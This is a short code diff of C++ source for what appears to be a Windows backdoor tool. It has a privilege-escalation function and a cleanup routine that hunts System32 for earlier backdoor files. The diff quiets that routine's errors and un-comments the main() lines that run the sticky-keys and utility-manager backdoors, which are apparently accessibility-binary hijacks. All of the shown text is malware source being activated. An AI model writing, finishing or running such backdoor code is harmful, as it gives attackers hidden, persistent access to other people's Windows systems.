@@ -42,7 +42,7 @@ void priv_esc() {
 
 void cleanup() {
     //searches through system32 to find previously-run backdoors
-    error_handling(system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt"), "dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt");
+    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt 2> nul");
     std::vector<std::string> replacedExecutables;
     std::ifstream file("C:\\Windows\\System32\\old_files.txt");
     std::string line;
@@ -129,9 +129,9 @@ int main(){
     cleanup();
 
     //executes backdoors
-    // std::cout << "Executing Backdoors..." << std::endl;
-    // sticky_keys();
-    // utility_manager();
+    std::cout << "Executing Backdoors..." << std::endl;
+    sticky_keys();
+    utility_manager();
     // narrator();
     // on_screen_keyboard();
     // magnifier();
